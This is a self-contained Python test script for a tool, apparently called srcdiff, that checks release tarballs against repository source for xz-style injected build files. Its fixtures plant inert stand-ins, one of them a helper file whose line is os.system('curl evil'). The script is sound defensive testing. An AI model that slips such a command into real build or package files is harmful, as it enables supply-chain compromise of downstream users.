#!/usr/bin/env python3
"""Plant known divergences, assert srcdiff finds exactly those.

A detector nobody has watched fail is not evidence. Every case here builds two
archives with one deliberate difference and checks both that the difference is
found AND that it lands in the right severity bucket -- a tool that flags
everything is as useless as one that flags nothing.

No network, no pytest. Run it: python3 t/test_srcdiff.py
"""
import io
import subprocess
import sys
import tarfile
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
SRCDIFF = HERE.parent / "srcdiff.py"

BASE = {
    "setup.cfg": b"[metadata]\nname = demo\n",
    "src/demo/__init__.py": b"VERSION = '1.0'\n",
    "src/demo/core.py": b"def run():\n    return 42\n",
    "README.md": b"# demo\n",
}

passed = 0
failed = 0


def make_tar(path, files, root):
    with tarfile.open(path, "w:gz") as tf:
        for name, content in files.items():
            info = tarfile.TarInfo(f"{root}/{name}")
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))


def run(artifact_files, repo_files, artifact_root="demo-1.0", repo_root="demo-1.0"):
    with tempfile.TemporaryDirectory() as td:
        a = Path(td) / "artifact.tar.gz"
        r = Path(td) / "repo.tar.gz"
        make_tar(a, artifact_files, artifact_root)
        make_tar(r, repo_files, repo_root)
        proc = subprocess.run(
            [sys.executable, str(SRCDIFF), "compare", str(a), str(r)],
            capture_output=True, text=True)
        return proc.returncode, proc.stdout + proc.stderr


def check(label, artifact, repo, want_rc, want_in=None, want_not_in=None, **kw):
    global passed, failed
    rc, out = run(artifact, repo, **kw)
    problems = []
    if rc != want_rc:
        problems.append(f"exit {rc}, want {want_rc}")
    if want_in and want_in not in out:
        problems.append(f"missing {want_in!r} in output")
    if want_not_in and want_not_in in out:
        problems.append(f"unexpected {want_not_in!r} in output")

    if problems:
        failed += 1
        print(f"FAIL {label}")
        for p in problems:
            print(f"       {p}")
        print("     ---- output ----")
        for line in out.strip().splitlines():
            print(f"     {line}")
    else:
        passed += 1
        print(f"ok   {label}")


# ------------------------------------------------------------------ the baseline

check("identical archives are clean",
      BASE, BASE, want_rc=0, want_in="No suspicious findings")

# ------------------------------------------- the xz shape: shipped code, no source

check("extra .py in the artifact is HIGH",
      {**BASE, "src/demo/build_helper.py": b"import os\nos.system('curl evil')\n"},
      BASE,
      want_rc=1, want_in="HIGH")

check("extra .sh in the artifact is HIGH",
      {**BASE, "build-to-host.sh": b"#!/bin/sh\n# the xz one\n"},
      BASE,
      want_rc=1, want_in="HIGH")

check("extra .m4 in the artifact is HIGH",
      {**BASE, "m4/build-to-host.m4": b"dnl injected\n"},
      BASE,
      want_rc=1, want_in="HIGH")

check("extra .so in the artifact is HIGH",
      {**BASE, "src/demo/_fast.so": b"\x7fELF\x02\x01\x01"},
      BASE,
      want_rc=1, want_in="HIGH")

# --------------------------------------------- modified code is MEDIUM, not HIGH

check("changed .py content is MEDIUM",
      {**BASE, "src/demo/core.py": b"def run():\n    return 1337\n"},
      BASE,
      want_rc=1, want_in="MEDIUM")

# ------------------------------------------------ noise that must NOT be flagged

check("PKG-INFO only in the artifact is suppressed",
      {**BASE, "PKG-INFO": b"Metadata-Version: 2.1\n"},
      BASE,
      want_rc=0, want_in="generated", want_not_in="HIGH")

check("egg-info only in the artifact is suppressed",
      {**BASE, "demo.egg-info/SOURCES.txt": b"setup.cfg\n"},
      BASE,
      want_rc=0, want_not_in="HIGH")

check("setuptools-scm _version.py is suppressed",
      {**BASE, "src/demo/_version.py": b"__version__ = '1.0'\n"},
      BASE,
      want_rc=0, want_not_in="HIGH")

check("extra README in the artifact is not code",
      {**BASE, "CHANGELOG.rst": b"1.0\n---\n"},
      BASE,
      want_rc=0, want_not_in="HIGH")

check("line-ending-only difference is not a finding",
      {**BASE, "src/demo/core.py": b"def run():\r\n    return 42\r\n"},
      BASE,
      want_rc=0, want_in="eol-only")

check(".github only in the repo is expected",
      BASE,
      {**BASE, ".github/workflows/ci.yml": b"on: push\n"},
      want_rc=0, want_not_in="HIGH")

check("tests/ only in the repo is expected",
      BASE,
      {**BASE, "tests/test_core.py": b"def test(): pass\n"},
      want_rc=0, want_not_in="HIGH")

# -------------------------------------------------------- missing source is noted

check("source file missing from the artifact is reported, not suspicious",
      BASE,
      {**BASE, "src/demo/extra.py": b"# real source\n"},
      want_rc=0, want_in="repo-only")

# -------------------------------------------- the two roots are named differently

check("differing archive root names still compare",
      BASE, BASE,
      want_rc=0, want_in="No suspicious findings",
      artifact_root="demo-1.0", repo_root="demo-repo-abc123")

# --------------------------------------------------- several findings at once

rc, out = run(
    {**BASE,
     "evil.sh": b"#!/bin/sh\n",
     "src/demo/core.py": b"def run():\n    return 0\n",
     "PKG-INFO": b"Metadata-Version: 2.1\n"},
    BASE)
if rc == 1 and "HIGH" in out and "MEDIUM" in out and "2 suspicious" in out:
    passed += 1
    print("ok   counts HIGH and MEDIUM together, ignores generated")
else:
    failed += 1
    print(f"FAIL mixed findings: exit {rc}")
    for line in out.strip().splitlines():
        print(f"     {line}")

print(f"\n{passed} passed, {failed} failed")
sys.exit(1 if failed else 0)
